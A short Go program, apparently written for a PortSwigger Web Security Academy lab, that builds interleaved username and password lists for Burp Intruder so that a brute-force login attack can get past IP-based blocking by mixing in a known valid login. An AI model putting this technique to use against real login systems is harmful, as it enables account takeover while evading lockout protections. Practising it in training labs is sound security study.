package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
)

func generateUsers(c chan string, total int) {

	defer close(c)

	validUser := "wiener"
	invalidUser := "carlos"

	for i := 1; i <= total; i++ {
		if i%3 == 0 {
			c <- validUser
		} else {
			c <- invalidUser
		}
	}

}

func generatePassword(inputFile, outputFile, extraLine string) error {
	in, err := os.Open(inputFile)
	if err != nil {
		return fmt.Errorf("error abriendo archivo de entrada: %v", err)
	}
	defer in.Close()

	out, err := os.Create(outputFile)
	if err != nil {
		return fmt.Errorf("error creando archivo de salida: %v", err)
	}
	defer out.Close()

	reader := bufio.NewScanner(in)
	writer := bufio.NewWriter(out)
	defer writer.Flush()

	lineCount := 0

	for reader.Scan() {
		lineCount++
		line := reader.Text()

		fmt.Fprintln(writer, line)

		if lineCount%2 == 0 {
			fmt.Fprintln(writer, extraLine)
		}
	}
 return nil
  } 


func main() {

	total := 200
	users := make(chan string)
	go generateUsers(users, total)

	f, err := os.Create("users.txt")

    if err != nil {
		log.Println("Error creating file:", err)
		return
	}
	defer f.Close()

	w := bufio.NewWriter(f)
	defer w.Flush()

	for user := range users {
		_, err := fmt.Fprint(w, user+"\n")
		if err != nil {
			log.Println("Error writing to file:", err)
			return
		}

	}

      generatePassword("portswigger-password.txt","final_pass.txt","peter")

      fmt.Println("[+] Usernames written to users.txt")
      fmt.Println("[+] Passwords written to final_pass.txt")
      fmt.Println("[!] Use users_txt and final_pass.txt in Burp Intruder to bypass IP blocking.")


}
